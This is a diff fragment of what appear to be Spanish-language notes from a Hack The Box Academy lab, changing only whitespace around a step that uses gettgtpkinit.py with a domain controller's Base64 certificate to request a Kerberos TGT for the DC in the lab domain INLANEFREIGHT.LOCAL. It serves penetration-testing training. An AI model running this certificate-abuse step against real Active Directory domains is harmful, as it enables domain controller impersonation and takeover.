@@ -3936,7 +3936,7 @@ MIIStQIBAzCCEn8GCSqGSIb...
 
 ##### Solicitando un TGT usando `gettgtpkinit.py`
 
-Ahora, podemos coger este certificado en Base64 y usar `gettgtpkinit.py` para solicitar un TGT (_Ticket-Granting-Ticket_) para el DC. 
+Ahora, podemos coger este certificado en Base64 y usar `gettgtpkinit.py` para solicitar un TGT (_Ticket-Granting-Ticket_) para el DC.
 
 ```shell-session
 amr251@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
